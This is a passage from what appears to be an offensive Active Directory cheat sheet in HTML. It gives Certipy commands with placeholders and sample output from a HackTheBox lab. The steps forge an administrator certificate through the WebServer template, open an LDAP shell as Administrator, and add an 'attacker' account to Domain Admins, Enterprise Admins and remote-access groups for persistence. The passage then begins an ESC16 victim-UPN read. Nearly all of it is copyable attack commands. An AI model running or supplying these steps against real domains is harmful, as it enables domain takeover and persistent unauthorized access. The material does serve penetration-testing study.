</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'WebServer' -upn 'administrator@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -sid '<span class="o editable-keyword">&lt;SID&gt;</span>' -application-policies 'Client Authentication'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'cert_admin@tombwatcher.htb'</span> -p <span class="s1">'Password123!'</span> -k -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -dc-host DC01.tombwatcher.htb -ns 10.129.31.255 -ca tombwatcher-CA-1 -template <span class="s1">'WebServer'</span> -upn <span class="s1">'administrator@tombwatcher.htb'</span> -sid <span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-1111'</span> -application-policies <span class="s1">'Client Authentication'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 13
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@tombwatcher.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'WebServer' -upn 'administrator@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -sid '<span class="o editable-keyword">&lt;SID&gt;</span>' -application-policies 'Client Authentication'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'cert_admin@tombwatcher.htb'</span> -hashes <span class="s1">'2b576acbe6bcfda7294d6bd18041b8fe'</span> -k -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -dc-host DC01.tombwatcher.htb -ns 10.129.31.255 -ca tombwatcher-CA-1 -template <span class="s1">'WebServer'</span> -upn <span class="s1">'administrator@tombwatcher.htb'</span> -sid <span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-1111'</span> -application-policies <span class="s1">'Client Authentication'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 14
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@tombwatcher.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'WebServer' -upn 'administrator@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -sid '<span class="o editable-keyword">&lt;SID&gt;</span>' -application-policies 'Client Authentication'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'cert_admin@tombwatcher.htb'</span> -k -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -dc-host DC01.tombwatcher.htb -ns 10.129.31.255 -ca tombwatcher-CA-1 -template <span class="s1">'WebServer'</span> -upn <span class="s1">'administrator@tombwatcher.htb'</span> -sid <span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-1111'</span> -application-policies <span class="s1">'Client Authentication'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 15
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@tombwatcher.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><h4 id="3-spawn-ldap-shell">3. Spawn LDAP Shell</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx 'administrator.pfx' -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ldap-shell
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad auth -pfx <span class="s1">'administrator.pfx'</span> -domain tombwatcher.htb -dc-ip 10.129.31.255 -ldap-shell
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN UPN: 'administrator@tombwatcher.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Connecting to 'ldaps://10.129.31.255:636'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticated to '10.129.31.255' as: 'u:TOMBWATCHER\\Administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">Type help for list of commands
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>
</span></span></div></pre></div><h4 id="4-persistence">4. Persistence</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add New User
</span></span><span class="line"><span class="cl"><span class="go">add_user <span class="o editable-keyword">&lt;NEW_USER&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">#</span> add_user attacker
</span></span><span class="line"><span class="cl"><span class="go">Attempting to create user in: %s CN=Users,DC=tombwatcher,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">Adding new user with username: attacker and password: bY&gt;$f0+G8{IDuG&gt; result: OK
</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add New User to Group
</span></span><span class="line"><span class="cl"><span class="go">add_user_to_group <span class="o editable-keyword">&lt;NEW_USER&gt;</span> Administrators
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">#</span> add_user_to_group attacker Administrators
</span></span><span class="line"><span class="cl"><span class="go">Adding user: attacker to group Administrators result: OK
</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add New User to Group
</span></span><span class="line"><span class="cl"><span class="go">add_user_to_group <span class="o editable-keyword">&lt;NEW_USER&gt;</span> 'Domain Admins'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">#</span> add_user_to_group attacker <span class="s1">'Domain Admins'</span>
</span></span><span class="line"><span class="cl"><span class="go">Adding user: attacker to group Domain Admins result: OK
</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add New User to Group
</span></span><span class="line"><span class="cl"><span class="go">add_user_to_group <span class="o editable-keyword">&lt;NEW_USER&gt;</span> 'Enterprise Admins'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">#</span> add_user_to_group attacker <span class="s1">'Enterprise Admins'</span>
</span></span><span class="line"><span class="cl"><span class="go">Adding user: attacker to group Enterprise Admins result: OK
</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add RDP
</span></span><span class="line"><span class="cl"><span class="go">add_user_to_group <span class="o editable-keyword">&lt;NEW_USER&gt;</span> 'Remote Desktop Users'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">#</span> add_user_to_group attacker <span class="s1">'Remote Desktop Users'</span>
</span></span><span class="line"><span class="cl"><span class="go">Adding user: attacker to group Remote Desktop Users result: OK
</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add Winrm
</span></span><span class="line"><span class="cl"><span class="go">add_user_to_group <span class="o editable-keyword">&lt;NEW_USER&gt;</span> 'Remote Management Users'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">#</span> add_user_to_group attacker <span class="s1">'Remote Management Users'</span>
</span></span><span class="line"><span class="cl"><span class="go">Adding user: attacker to group Remote Management Users result: OK
</span></span></span></div></pre></div></div></div><p></p>
<hr>
<h3 id="esc16-security-extension-disabled-on-ca-globally">ESC16: Security Extension Disabled on CA (Globally)</h3>
<p class="tabs">
<button data-tabset="set18" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set18"><div class="tabcontent active" data-tabset="set18" data-tabcontent="tab1"><h4 id="1-read-initial-upn-of-the-victim-account-optional">1. Read Initial UPN of the Victim Account [Optional]</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
